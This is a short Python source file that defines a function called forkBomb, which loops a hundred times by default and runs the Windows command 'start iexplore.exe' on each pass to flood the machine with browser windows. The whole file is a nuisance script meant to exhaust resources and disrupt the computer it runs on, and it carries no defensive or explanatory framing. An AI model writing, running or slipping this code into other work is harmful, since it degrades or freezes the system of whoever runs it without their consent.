import os


def forkBomb(number_of_windows=100):
    for i in range(number_of_windows):
        os.system("start iexplore.exe")
